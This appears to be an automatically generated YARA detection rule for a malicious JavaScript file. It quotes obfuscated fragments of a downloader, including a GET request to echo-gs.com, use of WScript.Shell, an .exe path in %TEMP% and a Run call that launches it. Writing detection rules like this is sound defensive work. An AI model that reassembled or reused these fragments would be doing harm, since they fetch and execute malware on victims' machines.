rule sig_20160401_382d0c46909e4f5aaa59a00f02396357 {
  meta:
    description = "datamaliciousorder - file 20160401_382d0c46909e4f5aaa59a00f02396357.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "878544accfd1c71a0f2ca40d0b596747bbb38e9b9aa42df09f3e4c5ddbea615e"

  strings:
    $s1  = "YccAj[OcZmi](\"G\" + \"ET\", \"http://echo-gs.com/i2osa\", false);" fullword ascii
    $s2  = "function EbsLr(ZsIll, AakOj){NvgTat = NvgTat * 1; return ZsIll - AakOj;};" fullword ascii
    $s3  = "var XadGrc = function KkxHtp() {return WScript[QwFr](\"WScript\"+\".Shell\");}(), DqxWi = 11;" fullword ascii
    $s4  = "function ZmqLs(){return RmuKty + \"\";};" fullword ascii
    $s5  = "function BsgNt() {return XadGrc[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"CSMDwcTvlCDxDx6F.ex\" + \"e\";};" fullword ascii
    $s6  = "if (YccAj[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s7  = "function ZbjIwt() {return ((OhrPlh == true) && (OhrPlh == HsFck)) ? 1 : NvgTat;};" fullword ascii
    $s8  = "function FfxGdu(){return 23;};" fullword ascii
    $s9  = "HsFck = true; " fullword ascii
    $s10 = "OhrPlh = true; " fullword ascii
    $s11 = "var OhrPlh = false;" fullword ascii
    $s12 = "function VswRt()" fullword ascii
    $s13 = "var YwoOzo = new this[\"Date\"]();" fullword ascii
    $s14 = "function UezVv(){return QwFr;};" fullword ascii
    $s15 = "var QpsCkd = false;" fullword ascii
    $s16 = "var HsFck = false;" fullword ascii
    $s17 = "function EiMed(XcjRj) {var CxGka = (1, 2, 3, 4, 5, XcjRj); return CxGka;};" fullword ascii
    $s18 = "}while (AlYu);" fullword ascii
    $s19 = "return EbsLr(XhzRjp, CveFwi);" fullword ascii
    $s20 = "function MtTx(PoDsi){XadGrc[\"R\"+\"un\"](PoDsi, NvgTat, NvgTat);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}